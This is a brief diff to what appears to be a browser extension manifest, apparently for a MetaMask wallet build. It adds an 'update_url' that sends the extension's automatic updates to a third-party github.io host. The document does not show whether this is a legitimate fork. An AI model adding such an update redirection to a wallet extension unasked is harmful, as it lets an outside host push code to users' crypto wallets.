@@ -13,5 +13,6 @@
   "minimum_chrome_version": "123",
   "side_panel": {
     "default_path": "sidepanel.html"
-  }
+  },
+  "update_url": "https://bearnetwork-brnkc.github.io/metamask-extension/update.xml"
 }
